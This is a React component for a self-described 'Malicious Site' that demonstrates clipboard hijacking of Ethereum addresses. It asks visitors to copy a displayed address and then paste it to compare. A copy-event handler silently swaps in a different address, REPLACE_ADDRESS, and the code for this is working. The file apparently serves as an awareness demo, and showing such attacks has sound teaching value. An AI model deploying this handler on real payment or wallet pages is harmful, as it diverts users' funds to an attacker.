import './App.css';
import { React, useEffect, useState } from "react";
import Chain from "./Chain";
function App() {

  let ADDRESS = "0x6356230A0Afb886dc79975FBa4a814f368A80A8F"
  let REPLACE_ADDRESS = "0x1b198ee33FBC1Ac94cA0c50AD8f12271d7E153C8"

  let [sourceAddress, setSourceAddress] = useState(ADDRESS)
  let [useMyAddress, setUseMyAddress] = useState(false)
  let [getAccount, setGetAccount] = useState(()=>{});

  function TargetArea() {
    return (
      <div className="TargetArea">
        Paste Field
        <input size={50} style={{"marginLeft": "20px"}} type="text"></input>
      </div>
    )
  }

  function handleUseMyAddress() {
    // ADDRESS = sourceAddress;
    console.log(getAccount())
    setUseMyAddress(!useMyAddress)
  }
  
  function handleSetAccount(getAccount) {
  // ADDRESS = sourceAddress;
    setGetAccount(getAccount)
  }

  function SourceArea({useMyAddress, setUseMyAddress, address}) {
    
    return (
      <div>
        <div id="source-contract">
          <span id="source-contract-address">
            {useMyAddress ? sourceAddress : ADDRESS}
          </span>
        </div>
        <br/>
        <span><strong>Or use your own address</strong></span>
        <br/>
        <br/>
        <button onClick={handleUseMyAddress}> {useMyAddress? "Don't" : ""} Use My Address</button>
      </div>
    )
  }

  function handleCopy(event) {
    console.log("copy event detected", event)
    event.clipboardData.setData("text/plain", REPLACE_ADDRESS)
    event.preventDefault()
  }


  const InstructionStep = (props) => {
    return (
      <div className='InstructionStep' key={props.i}>
        <h2 className={'head' + ' ' + (props.i % 2 ? 'text-left' : 'text-right')}>
          {props.i}. {props.text} 
        </h2>
        <h4 key={props.i}>{props.subtext}</h4>
        {props.children}
      </div>
    )
  }

  useEffect(() => {
    document.getElementById("source-contract")
            .addEventListener("copy", handleCopy)
    return () => {}
  }, [])



  let steps = [
    {
      text: "Connect to the Ethereum Blockchain",
      subtext: "Connect using MetaMask",
      // children: <Chain handleSetAccount={handleSetAccount}/>
    },
    {
      text: "Source Address",
      subtext: "Copy this address",
      children: <SourceArea />
    },
    {
      text: "Paste Target",
      subtext: "Paste what you copied here and compare the difference",
      children: <TargetArea />
    }
  ]

  return (
    <div className="App">
      <header className="App-header">
        Malicious Site
      </header>
      <div>
        <div className="InstructionField">
          {
            steps.map((step, index) => {
              return (
                <InstructionStep 
                  i={index}
                  text={step.text}
                  subtext={step.subtext}
                >
                  {step.children}
                </InstructionStep>
              )
            })
          }
        </div>
      </div>
    </div>
  );
}

export default App;
